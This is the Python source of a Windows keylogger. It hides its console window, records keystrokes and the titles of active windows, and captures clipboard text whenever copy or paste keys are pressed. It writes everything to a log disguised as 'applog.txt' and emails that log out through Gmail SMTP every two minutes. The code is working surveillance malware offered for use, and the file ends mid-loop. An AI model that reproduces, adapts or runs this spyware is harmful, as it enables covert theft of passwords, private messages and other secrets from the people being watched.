import ctypes
import logging
import smtplib
import datetime
import schedule
import time
import os

# libs
kernel32 = ctypes.windll.kernel32
user32 = ctypes.windll.user32

# Hide window
user32.ShowWindow(kernel32.GetConsoleWindow(), 0)

# Mailing function
EMAIL = 'yourmail@domain.com' # Enter your email id
PASSWORD = 'yourmailpassword' # Your email id's password here

def sendMail():
    log_dir = os.environ['localappdata']
    log_name = 'applog.txt'
    s = smtplib.SMTP('smtp.gmail.com', 587)
    s.starttls()
    s.login(EMAIL, PASSWORD)
    f = open(os.path.join(log_dir, log_name), 'r')
    message = "Subject:{0}\n\n{1}".format(datetime.datetime.now().strftime("%d-%m-%y %H:%M:%S"),f.read())
    s.sendmail(EMAIL, EMAIL, message) # it will mail to yourself
    s.quit()
    f.close()

def get_current_window():

    GetForegroundWindow = user32.GetForegroundWindow
    GetWindowTextLength = user32.GetWindowTextLengthW
    GetWindowText = user32.GetWindowTextW

    handle_window = GetForegroundWindow() 
    length = GetWindowTextLength(handle_window) 
    buffer = ctypes.create_unicode_buffer(length + 1) 
    
    GetWindowText(handle_window, buffer, length + 1) 

    return buffer.value

def get_clipboard():
    
    CF_TEXT = 1 # clipboard format

    # return types for GlobalLock/GlobalUnlock.
    kernel32.GlobalLock.argtypes = [ctypes.c_void_p]
    kernel32.GlobalLock.restype = ctypes.c_void_p
    kernel32.GlobalUnlock.argtypes = [ctypes.c_void_p]

    # Return type for GetClipboardData
    user32.GetClipboardData.restype = ctypes.c_void_p
    user32.OpenClipboard(0)
    
    # Required clipboard functions
    IsClipboardFormatAvailable = user32.IsClipboardFormatAvailable
    GetClipboardData = user32.GetClipboardData
    CloseClipboard = user32.CloseClipboard

    try:
        if IsClipboardFormatAvailable(CF_TEXT): # If CF_TEXT is available
            data = GetClipboardData(CF_TEXT) # Get handle to data in clipboard
            data_locked = kernel32.GlobalLock(data) # Get pointer to memory location where the data is located
            text = ctypes.c_char_p(data_locked) # Get a char * pointer (string in Python) to the location of data_locked
            value = text.value # Dump the content in value
            kernel32.GlobalUnlock(data_locked) # Decrement de lock count
            return value.decode('utf-8') # Return the clipboard content
    finally:
        CloseClipboard() # Close the clipboard

def get_keystrokes(log_dir, log_name): # Function to monitor and log keystrokes
    schedule.every(2).minutes.do(sendMail) # You can change from 2 minutes to your desired minute for mailing.
    # Delete logger before starting
    if os.path.exists(log_dir +"\\"+ log_name):
        os.remove(log_dir +"\\"+ log_name)

    # Logger
    logging.basicConfig(filename=(log_dir +"\\" + log_name), level=logging.DEBUG, format='%(message)s')

    GetAsyncKeyState = user32.GetAsyncKeyState # WinAPI function that determines whether a key is up or down
    special_keys = {0x08: 'BS', 0x09: 'Tab', 0x10: 'Shift', 0x11: 'Ctrl', 0x12: 'Alt', 0x14: 'CapsLock', 0x1b: 'Esc', 0x20: 'Space', 0x2e: 'Del'}
    current_window = None
    line = [] # Stores the characters pressed

    while True:
        schedule.run_pending()
        if current_window != get_current_window(): # If the content of current_window isn't the currently opened window
            current_window = get_current_window() # Put the window title in current_window
            logging.info(str(current_window).encode('utf-8')) # Write the current window title in the log file
        
        for i in range(1, 256): # Because there are 256 ASCII characters (even though we only really use 128)
            if GetAsyncKeyState(i) & 1: # If a key is pressed and matches an ASCII character
                if i in special_keys: # If special key, log as such
                    logging.info("<{}>".format(special_keys[i]))
                elif i == 0x0d: # If <ENTER>, log the line typed then clear the line variable
                    logging.info(line)
                    line.clear()
                elif i == 0x63 or i == 0x43 or i == 0x56 or i == 0x76: # If characters 'c' or 'C' are pressed, get clipboard data
                    clipboard_data = get_clipboard()
                    logging.info("[CLIPBOARD] {}".format(clipboard_data))
                elif 0x30 <= i <= 0x5a: # If alphanumeric character, append to line
                    line.append(chr(i))